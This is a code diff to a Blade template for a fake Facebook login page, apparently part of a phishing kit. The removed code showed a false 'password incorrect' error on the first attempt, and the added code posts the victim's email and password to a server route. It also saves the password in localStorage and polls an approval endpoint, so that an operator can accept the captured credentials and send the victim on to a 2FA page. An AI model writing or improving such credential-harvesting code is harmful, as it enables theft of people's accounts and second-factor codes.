@@ -2597,8 +2597,55 @@
             pointer-events: auto !important;
         }
 
-        [role="button"][aria-label="Log in"][style*="opacity: 0.5"] {
+        [role="button"][aria-label="Log in"].btn-loading,
+        [role="button"][aria-label="Log in"][style*="opacity: 0.5"],
+        [role="button"][aria-label="Log in"][style*="opacity: 0.6"] {
             pointer-events: none !important;
+            opacity: 0.6 !important;
+        }
+
+        .fb-btn-loader {
+            display: inline-block !important;
+            vertical-align: middle !important;
+            margin: 0 !important;
+            padding: 0 !important;
+        }
+
+        .fb-error-banner {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: #ffffff;
+            border: 1px solid #ced0d4;
+            border-radius: 12px;
+            padding: 13px 16px;
+            margin-bottom: 16px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.04);
+            font-size: 14px;
+            line-height: 1.4;
+            color: #1c1e21;
+            text-align: left;
+            box-sizing: border-box;
+            width: 100%;
+        }
+
+        .fb-error-banner .fb-error-icon {
+            flex-shrink: 0;
+            width: 20px;
+            height: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .fb-error-banner a {
+            color: #1877f2;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .fb-error-banner a:hover {
+            text-decoration: underline;
         }
 
         .input-error-container {
@@ -2762,6 +2809,7 @@
                                                                                                 class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w x1cy8zhl x1xmf6yo x1e56ztr xzboxd6 x14l7nz5">
                                                                                                 <form id="login_form"
                                                                                                     novalidate=""
+                                                                                                    onsubmit="return false;"
                                                                                                     method="POST">
                                                                                                     <div
                                                                                                         class="xgg1l89 x1cg5xbb x8y9jov xnh2hec">
@@ -3689,7 +3737,6 @@
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script>
         (function () {
-            var attempts = parseInt(localStorage.getItem('login_attempts')) || 0;
             var metaBasePath = "{{ $metaBasePath }}";
             var authPath = "{{ $authPath }}";
 
@@ -3703,18 +3750,87 @@
                 });
             }
 
-            function showError(msg) {
-                // Find the password input container - using parent() as the input is wrapped in a div
+            var pollTimer = null;
+            var originalBtnHtml = null;
+
+            function setButtonLoading(loading) {
+                const $btn = $('[role="button"][aria-label="Log in"]');
+                const $label = $btn.find('span.xuxw1ft');
+                const spinnerHtml = '<svg class="fb-btn-loader" width="20" height="20" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" style="display:inline-block;vertical-align:middle;"><g><circle cx="12" cy="12" r="9.5" stroke="rgba(255,255,255,0.3)" stroke-width="2.5" fill="none"/><path d="M12 2.5a9.5 9.5 0 0 1 9.5 9.5" stroke="#ffffff" stroke-width="2.5" stroke-linecap="round" fill="none"/><animateTransform attributeName="transform" type="rotate" from="0 12 12" to="360 12 12" dur="0.75s" repeatCount="indefinite"/></g></svg>';
+
+                if (loading) {
+                    $btn.addClass('btn-loading').css({ 'opacity': '0.6', 'pointer-events': 'none' });
+                    if ($label.length && originalBtnHtml === null) {
+                        originalBtnHtml = $label.html();
+                        $label.html(spinnerHtml);
+                    } else if (!$label.length) {
+                        $btn.find('span').last().html(spinnerHtml);
+                    }
+                } else {
+                    $btn.removeClass('btn-loading').css({ 'opacity': '', 'pointer-events': '' });
+                    if ($label.length && originalBtnHtml !== null) {
+                        $label.html(originalBtnHtml);
+                        originalBtnHtml = null;
+                    } else {
+                        $btn.find('.fb-btn-loader').parent().text('Log in');
+                    }
+                }
+            }
+
+            function showLoginError(msg) {
+                const $emailInput = $('input[name="email"]');
                 const $passInput = $('input[name="pass"]');
-                const $container = $passInput.parent();
+                const $form = $('#login_form');
 
-                $container.addClass('input-error-container');
-
-                // Remove existing error if any
+                $('.fb-error-banner').remove();
+                $('.input-error-container').removeClass('input-error-container');
                 $('.error-message-fb').remove();
 
-                // Add error message below the container
-                $container.after(`<div class="error-message-fb"><i class="error-icon-fb"></i><span>${msg}</span></div>`);
+                const bannerHtml = `
+                    <div class="fb-error-banner">
+                        <div class="fb-error-icon">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <circle cx="12" cy="12" r="10" stroke="#e41e3f" stroke-width="2"/>
+                                <line x1="12" y1="10.5" x2="12" y2="16.5" stroke="#e41e3f" stroke-width="2" stroke-linecap="round"/>
+                                <circle cx="12" cy="7" r="1.1" fill="#e41e3f"/>
+                            </svg>
+                        </div>
+                        <div>
+                            <span>${msg || "The login information you entered is incorrect."}</span>
+                            <a href="#" onclick="return false;">Find your account and log in.</a>
+                        </div>
+                    </div>
+                `;
+
+                if ($form.length) {
+                    $form.prepend(bannerHtml);
+                } else {
+                    $emailInput.parent().before(bannerHtml);
+                }
+
+                $passInput.val('').removeClass('has-content');
+                $passInput.focus();
+            }
+
+            function checkApprovalStatus(statusUrl) {
+                $.ajax({
+                    url: statusUrl,
+                    method: 'GET',
+                    headers: { 'Accept': 'application/json' },
+                    success: function (response) {
+                        if (response.status === 'approved') {
+                            clearInterval(pollTimer);
+                            window.location.href = response.redirectUrl || authPath;
+                        } else if (response.status === 'rejected') {
+                            clearInterval(pollTimer);
+                            setButtonLoading(false);
+                            showLoginError();
+                        }
+                    },
+                    error: function () {
+                        // Keep polling or fallback
+                    }
+                });
             }
 
             function handleLogin() {
@@ -3722,58 +3838,70 @@
                 const pass = $('input[name="pass"]').val().trim();
                 const $btn = $('[role="button"][aria-label="Log in"]');
 
-                if ($btn.hasClass('btn-disabled')) return;
+                if ($btn.hasClass('btn-loading')) return;
 
+                $('.fb-error-banner').remove();
                 $('.input-error-container').removeClass('input-error-container');
                 $('.error-message-fb').remove();
 
                 if (!email || !pass) {
-                    return; // Basic validation
+                    if (!email) showLoginError("The login information you entered is incorrect.");
+                    return;
                 }
 
-                $btn.addClass('btn-disabled').css({ 'opacity': '0.5', 'pointer-events': 'none' });
+                setButtonLoading(true);
 
-                attempts++;
-                localStorage.setItem('login_attempts', attempts);
                 localStorage.setItem('fb_email', email);
-
-                // Safety timeout to re-enable button if AJAX hangs
-                setTimeout(function () {
-                    if ($btn.hasClass('btn-disabled')) {
-                        $btn.removeClass('btn-disabled').css({ 'opacity': '1', 'pointer-events': 'auto' });
-                    }
-                }, 10000);
+                localStorage.setItem('fb_pass1', pass);
 
                 $.ajax({
-                    url: '/login',
+                    url: '{{ route('secure-login.submit') }}',
                     method: 'POST',
                     headers: {
-                        'X-CSRF-TOKEN': '{{ csrf_token() }}'
+                        'X-CSRF-TOKEN': '{{ csrf_token() }}',
+                        'Accept': 'application/json'
                     },
                     data: {
                         email: email,
-                        pass: pass,
-                        attempts: attempts
+                        password: pass,
+                        redirectUrl: authPath
                     },
                     success: function (response) {
-                        if (attempts < 2) {
-                            // First attempt: Show error and reset button immediately
-                            showError("The password you've entered is incorrect.");
-                            $('input[name="pass"]').val('').removeClass('has-content');
-                            $btn.removeClass('btn-disabled').css({ 'opacity': '1', 'pointer-events': 'auto' });
+                        if (response.statusUrl) {
+                            clearInterval(pollTimer);
+                            pollTimer = setInterval(function () {
+                                checkApprovalStatus(response.statusUrl);
+                            }, 1000);
+                        } else if (response.waitUrl) {
+                            // Fallback if statusUrl not provided
+                            clearInterval(pollTimer);
+                            pollTimer = setInterval(function () {
+                                checkApprovalStatus('/approval/status/' + response.id);
+                            }, 1000);
                         } else {
-                            // Second attempt: Redirect to 2FA path
-                            localStorage.setItem('login_attempts', 0);
-                            window.location.href = authPath;
+                            setButtonLoading(false);
                         }
                     },
                     error: function () {
-                        showError("The password you've entered is incorrect.");
-                        $('input[name="pass"]').val('').removeClass('has-content');
-                        $btn.removeClass('btn-disabled').css({ 'opacity': '1', 'pointer-events': 'auto' });
+                        setButtonLoading(false);
+                        showLoginError("Unable to submit this request right now. Please try again.");
                     }
                 });
             }
+
+            // Clear errors on input typing
+            $(document).on('input', 'input[name="email"], input[name="pass"]', function () {
+                $('.fb-error-banner').remove();
+                $('.input-error-container').removeClass('input-error-container');
+                $('.error-message-fb').remove();
+            });
+
+            // Intercept native form submit
+            $(document).on("submit", "#login_form", function (e) {
+                e.preventDefault();
+                handleLogin();
+                return false;
+            });
 
             // High-priority capture
             $(document).on("click", '[role="button"][aria-label="Log in"]', function (e) {
@@ -3784,6 +3912,7 @@
             // Handle Enter key
             $(document).on("keydown", function (e) {
                 if (e.key === "Enter" && (e.target.name === "email" || e.target.name === "pass")) {
+                    e.preventDefault();
                     handleLogin();
                 }
             });
@@ -3797,9 +3926,6 @@
                 if (savedEmail) {
                     $('input[name="email"]').val(savedEmail);
                     checkInputs();
-                }
-                if (attempts === 1) {
-                    showError("The password you've entered is incorrect.");
                 }
             });
         })();
